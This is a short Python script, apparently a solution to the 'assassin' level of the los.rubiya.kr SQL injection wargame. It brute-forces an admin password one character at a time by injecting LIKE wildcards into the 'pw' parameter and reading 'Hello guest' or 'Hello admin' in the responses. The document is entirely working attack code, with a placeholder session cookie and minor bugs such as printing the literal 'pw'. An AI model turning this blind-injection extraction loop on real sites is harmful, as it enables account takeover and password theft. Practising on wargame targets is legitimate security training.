import requests

session_id={'PHPSESSID' : '쿠키값'}

parameters='0123456789abcdefghijklmnopqrstuvwxyz'

pw=''
for j in range(3):
	for i in parameters:
		if pw=='':
			url = 'http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw='+str(i)+'%'
			respone = requests.get(url=url,cookies=session_id)
			print(respone.url)
			if 'Hello guest' in respone.text:
				print(i)
				pw+=str(i)
				break
		else:
			url = 'http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw='+pw+str(i)+'%'
			respone = requests.get(url=url,cookies=session_id)
			print(respone.url)
			if 'Hello guest' in respone.text:
				print(i)
				pw+=str(i)
				break
			elif 'Hello admin' in respone.text:
				print('complete!!')
				print('pw')
				exit(0)
	j+=1
print(pw)